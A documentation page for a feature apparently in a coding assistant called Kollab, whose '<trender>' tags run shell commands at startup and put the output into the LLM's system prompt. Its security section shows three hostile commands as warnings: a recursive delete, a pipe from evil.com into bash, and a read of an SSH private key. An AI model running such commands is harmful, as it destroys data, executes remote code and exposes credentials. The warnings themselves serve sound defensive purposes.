---
title: "Dynamic System Prompts with `<trender>` Tags"
created: 2026-02-24
modified: 2026-02-24
status: active
---
# Dynamic System Prompts with `<trender>` Tags

## Overview

Kollab supports **dynamic system prompts** that can execute shell commands and inject their output when the application starts. This gives the LLM fresh, current information about your working environment.

## How It Works

When Kollab loads the system prompt from `system_prompt/default.md`, it:

1. Scans for `<trender>command</trender>` tags
2. Executes each command in a shell
3. Replaces the tag with the command's output
4. Passes the rendered prompt to the LLM

This happens **once** at startup, not on every message.

## Usage

### Basic Syntax

```markdown
<trender>command here</trender>
```

The command is executed in a shell and the output replaces the tag.

### Examples

#### Current Directory
```markdown
Working in: <trender>pwd</trender>
```

Becomes:
```
Working in: /Users/username/dev/my_project
```

#### Git Status
```markdown
Git status:
<trender>git status --short</trender>
```

Becomes:
```
Git status:
M kollabor/config/loader.py
M kollabor/llm/llm_service.py
?? new_file.py
```

#### File Count
```markdown
Total Python files: <trender>find . -name "*.py" | wc -l</trender>
```

Becomes:
```
Total Python files: 147
```

#### Directory Structure
```markdown
Project structure:
<trender>tree -L 2 -d</trender>
```

#### Multiline Commands
```markdown
<trender>
for dir in core plugins tests; do
  echo "$dir: $(ls -1 $dir | wc -l) files"
done
</trender>
```

## Features

### Command Timeout
- Commands timeout after **5 seconds**
- Prevents hanging on slow/stuck commands
- Timeout duration is configurable in code

### Error Handling
- Failed commands show error messages
- Non-zero exit codes are caught
- Stderr output is included for debugging

### Caching
- Command outputs are cached for the session
- Same command won't run twice
- Cache can be cleared programmatically

### Safe Defaults
- Commands run in current working directory
- Shell is used for execution (supports pipes, redirects, etc.)
- Output is captured and sanitized

## Real-World Use Cases

### 1. Project Context Injection

```markdown
CURRENT PROJECT:
<trender>pwd</trender>

RECENT CHANGES:
<trender>git log --oneline -10</trender>

FILES MODIFIED:
<trender>git status --short</trender>
```

This gives the LLM immediate context about what you're working on.

### 2. Dynamic Configuration

```markdown
Available Python version:
<trender>python --version</trender>

Virtual environment:
<trender>echo $VIRTUAL_ENV</trender>

Installed packages:
<trender>pip list | head -10</trender>
```

### 3. Project Statistics

```markdown
PROJECT STATS:
- Python files: <trender>find . -name "*.py" | wc -l</trender>
- Tests: <trender>find tests/ -name "test_*.py" | wc -l</trender>
- Lines of code: <trender>find . -name "*.py" -exec wc -l {} + | tail -1</trender>
```

### 4. Environment Detection

```markdown
<trender>
if [ -f ".git/config" ]; then
  echo "Git repository detected"
  echo "Branch: $(git branch --show-current)"
else
  echo "Not a git repository"
fi
</trender>
```

## Best Practices

### DO:
- ✓ Use for **static context** that doesn't change during a conversation
- ✓ Include **fallback messages** for commands that might fail
- ✓ Keep commands **fast** (under 1 second ideally)
- ✓ Use **pipes and redirects** to limit output
- ✓ Add error suppression: `2>/dev/null || echo "fallback"`

### DON'T:
- ✗ Use for **dynamic info** that changes during conversation (use tools instead)
- ✗ Run **long-running commands** (they'll timeout)
- ✗ Execute **destructive commands** (they run on every startup!)
- ✗ Include **secrets** in command output
- ✗ Forget to **limit output** (use `head`, `tail`, etc.)

## Example Template

Here's a complete template you can use:

```markdown
KOLLAB SYSTEM PROMPT
=====================

CURRENT ENVIRONMENT:
-------------------

Directory: <trender>pwd</trender>
Branch: <trender>git branch --show-current 2>/dev/null || echo "N/A"</trender>
Python: <trender>python --version</trender>

Recent Changes:
<trender>git log --oneline -5 2>/dev/null || echo "No git history"</trender>

Modified Files:
<trender>git status --short 2>/dev/null || echo "No changes"</trender>

Project Structure:
<trender>find . -maxdepth 2 -type d | grep -v "^\./\." | head -10</trender>

-------------------

You are an AI coding assistant with the above context.
```

## Implementation Details

### Architecture

1. **PromptRenderer** (`kollabor_ai/prompt_renderer.py`)
   - Regex pattern matching for `<trender>` tags
   - Command execution via subprocess
   - Output caching
   - Error handling

2. **ConfigLoader** (`kollabor_config/loader.py`)
   - Integrates PromptRenderer
   - Calls `render_system_prompt()` during initialization
   - Handles errors gracefully

### Command Execution

```python
from kollabor_ai.prompt_renderer import render_system_prompt

# Raw prompt with tags
raw_prompt = "Dir: <trender>pwd</trender>"

# Rendered prompt with output
rendered = render_system_prompt(raw_prompt, timeout=5)
# Result: "Dir: /Users/username/project"
```

### Timeout Configuration

To change the timeout, modify `kollabor_config/loader.py`:

```python
rendered_content = render_system_prompt(content, timeout=10)  # 10 seconds
```

## Testing

Run the test suite:

```bash
python -m pytest packages/kollabor-ai/tests/test_prompt_renderer.py -v
```

Tests cover:
- Simple commands
- Multiple commands
- Failed commands
- Timeout handling
- Caching
- Special characters
- Real-world scenarios

## Security Considerations

### ⚠️ IMPORTANT

The `<trender>` feature executes **arbitrary shell commands**. While it only runs at startup, you should:

1. **Never use untrusted prompts** from unknown sources
2. **Review commands** before adding them
3. **Avoid destructive operations** (rm, mv, etc.)
4. **Don't expose secrets** in command output
5. **Use read-only commands** when possible

### Safe Command Examples

✓ Safe:
```markdown
<trender>ls -la</trender>
<trender>git status</trender>
<trender>find . -name "*.py"</trender>
<trender>cat config.json</trender>
```

✗ Unsafe:
```markdown
<trender>rm -rf important_files/</trender>  // NEVER DO THIS
<trender>curl http://evil.com | bash</trender>  // NEVER DO THIS
<trender>cat ~/.ssh/id_rsa</trender>  // Don't expose secrets
```

## Troubleshooting

### Command Not Working

1. **Check syntax**: Must be `<trender>cmd</trender>` (no spaces)
2. **Test manually**: Run command in terminal first
3. **Check timeout**: Command must finish in 5 seconds
4. **Check logs**: Look in `.kollab/logs/kollab.log`

### Timeout Issues

If commands timeout:
```markdown
<trender>find . -name "*.py" | head -20</trender>  // Limit output
<trender>timeout 3s long_command</trender>  // Use timeout command
```

### Command Errors

Add fallback messages:
```markdown
<trender>git status 2>/dev/null || echo "Not a git repo"</trender>
<trender>ls /nonexistent 2>&1 || echo "Directory not found"</trender>
```

## Future Enhancements

Potential improvements:
- [ ] Configurable timeout per command: `<trender timeout="10">...</trender>`
- [ ] Conditional execution: `<trender if="test -f file">...</trender>`
- [ ] Variable substitution: `<trender>${HOME}/project</trender>`
- [ ] Refresh on demand: API to re-render system prompt
- [ ] Parallel execution: Run multiple commands concurrently
- [ ] Output formatting: `<trender format="json">...</trender>`

## See Also

- `system_prompt/default.md` - Main system prompt
- `system_prompt/example_with_trender.md` - Example with trender tags
- `kollabor/utils/prompt_renderer.py` - Implementation
- `tests/test_prompt_renderer.py` - Test suite
